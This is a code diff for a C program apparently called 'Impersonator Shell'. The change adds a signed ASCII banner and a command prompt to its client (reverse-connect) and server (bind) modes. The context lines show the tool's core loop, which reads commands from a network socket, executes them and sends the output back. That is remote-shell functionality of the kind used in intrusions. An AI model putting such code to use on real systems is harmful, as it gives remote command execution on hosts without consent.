@@ -23,9 +23,18 @@ int header(int sockfd){
     write(sockfd, print_this, sizeof(char) * strlen(print_this));
     
     /*print Shell*/
-    char *print_that = "\n\t\t(~|_  _ ||\n\t\t _)| |(/_||\n";
+    char *print_that = "\n\t\t(~|_  _ ||\n\t\t _)| |(/_||\n\nBy Aleksa Zatezalo";
     write(sockfd, print_that, sizeof(char) * strlen(print_that));
 
+    return 0;
+}
+
+int command_prompt(int sockfd){
+
+    /*print Impersonator*/
+    char *print_this = "\n[Impersonator Shell]>";
+    write(sockfd, print_this, sizeof(char) * strlen(print_this));
+    
     return 0;
 }
 
@@ -115,6 +124,7 @@ void Client(char *address, char *port, int *type, int *family)
     }
     
     header(sockfd);
+    command_prompt(sockfd);
     while ((n = read(sockfd, buffer, MAXBUF)) > 0)
     {
         char *exec = doexec(buffer);
@@ -124,6 +134,7 @@ void Client(char *address, char *port, int *type, int *family)
         }
         free(exec);
         memset(buffer, 0, sizeof(buffer));
+        command_prompt(sockfd);
     }
 
     if (n == -1)
@@ -243,7 +254,7 @@ void Server(char *address, char *port, int *type, int *family)
     }
 
     header(clientfd);
-
+    command_prompt(clientfd);
     while ((n = read(clientfd, buffer, MAXBUF)) > 0)
     {
         char *exec = doexec(buffer);
@@ -253,6 +264,7 @@ void Server(char *address, char *port, int *type, int *family)
         }
         free(exec);
         memset(buffer, 0, sizeof(buffer));
+        command_prompt(clientfd);
     }
 
     if (n == -1)
